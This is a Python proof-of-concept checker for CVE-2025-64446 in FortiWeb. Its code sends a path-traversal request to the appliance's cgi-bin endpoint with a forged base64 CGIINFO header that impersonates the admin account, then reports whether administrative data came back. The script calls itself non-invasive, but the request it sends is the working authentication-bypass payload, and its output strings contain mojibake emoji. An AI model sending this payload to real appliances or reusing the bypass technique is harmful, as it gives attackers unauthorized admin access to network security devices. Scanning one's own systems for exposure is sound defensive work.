import base64
import json
import ssl
from http.client import HTTPSConnection
import sys
from time import time


# Non-invasive variant of poc.py that just probes the vulnerability without creating a user

USER = f"oops_{int(time())}"
PASSWORD = "password123!"

http = HTTPSConnection(
    "127.0.0.1",
    8443,
    context=ssl._create_unverified_context(),
)
http.request(
    "GET",
    "/api/v2.0/cmdb/system/admin%3f/../../../../../cgi-bin/fwbcgi?json=1",
    headers={
        "CGIINFO": base64.b64encode(
            json.dumps(
                {
                    "username": "admin",
                    "profname": "prof_admin",
                    "vdom": "root",
                    "loginname": "admin",
                }
            ).encode()
        ).decode(),
    },
)
r = http.getresponse()
text = r.read().decode()


if r.status == 200 and "admin" in text:
    print("ðŸ’¥ This FortiWeb instance is VULNERABLE to CVE-2025-64446 !")
    if "-v" in sys.argv:
        print(text)
else:
    print("âœ… This FortiWeb instance is NOT vulnerable to CVE-2025-64446 !")
    if "-v" in sys.argv:
        print(r.status, text)
